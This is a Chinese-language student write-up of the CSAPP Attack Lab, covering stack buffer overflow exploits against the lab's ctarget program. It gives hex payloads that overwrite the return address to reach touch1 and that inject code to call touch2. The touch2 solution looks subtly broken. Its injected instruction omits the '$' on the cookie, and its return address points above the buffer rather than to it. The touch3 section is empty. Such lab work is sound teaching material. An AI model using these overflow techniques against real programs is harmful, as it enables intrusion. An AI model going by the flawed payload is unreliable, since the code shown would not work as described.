# 任务理解
> 具体请详细阅读[readme](http://csapp.cs.cmu.edu/3e/README-attacklab)和[writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf)


简单来说，ctarget和rtarget是两个有buffer overflow bug的程序。我们需要通过code injection(代码注入) 和 returned-oritened programming（返回导向编程）的方式攻击这两个程序。

而这个bug的来源就是他们会通过标准化输入读取一段字符串，并存到栈上。

测试方法如下：
```
    unix> ./hex2raw < xxx.txt | ./ctarget -q
```
xxx.txt 就是输入的内容。要求输入为16进制数字对，用空格隔开。

# 基础知识
1. call指令
   将PC值压入栈空，jmp到函数所在为止
2. ret指令
   pop PC

# 准备工作
- 反汇编ctarget
```
objdump -S ctarget > ctarget.lst
```
- 可以安装gdb插件gdb-peda，方便调试

## 程序入口test函数
```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	call   4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	call   400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	ret    
```
## getbuf

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret   
```
栈空间分配了0x28 = 40B空间，这个空间用来存放标准输入的数据。

# touch1

``` asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	call   401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>
```
为了让test调用完getbuf()后，不会回到test函数，而是跳转到touch1()，需要修改栈中存储的PC值。
那么可以通过传入字符串填满getbuf()栈空间，并且修改栈中的PC值，所以传入字符串大小大于40B，40B数据后为touch1地址。
touch1.txt如下：
```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00
```
# touch2

## 分析任务要求

在touch1中看到终端显示：
Cookie: 0x59b997fa

touch2地址=00000000004017ec

touch2函数在writeup中有C语言代码，可以看出，touch2是将输入参数与cookie比较，如果相等才能成功

现在解决level2问题有以下关键点：
1. getbuf后跳转到touch2。在getbuf后注入一段代码，通过ret执行这个操作。和touch1操作不同是除了跳转还要执行特定代码。
2. touch2输入参数为cookie值，也就是将cookie值存放到%rdi。
3. 这段注入代码注入的位置在哪里？--getbuf函数栈顶位置

## 注入代码
```asm
mov 0x59b997fa, %rdi # cookie val
push 0x4017ec  # touch2 addr
ret # pop 0x4017ec = PC, jmp to here
```
将上述汇编代码touch2.s转为16进制代码：
unix> gcc -c touch2.s
unix> objdump -d touch2.o > touch2.d

touch2.d内容如下：

```asm
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 8b 3c 25 fa 97 b9 	mov    0x59b997fa,%rdi
   7:	59 
   8:	ff 34 25 ec 17 40 00 	push   0x4017ec
   f:	c3                   	ret 
```
## 注入位置
```asm
(gdb) b getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.
(gdb) r -q -i t1raw.txt 
Starting program: /home/eve/work/CSAPP3e-lab-self-study/03-attack/ctarget -q -i t1raw.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12
12      buf.c: 没有那个文件或目录.
(gdb) p /x $rsp
$1 = 0x5561dca0
```
## 最终输入touch2.txt

```
48 8b 3c 25 fa 97 b9 59
ff 34 25 ec 17 40 00 c3 # 注入代码，栈顶
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
a0 dc 61 55 00 00 00 00 # 栈底
```
## 测试

# touch3
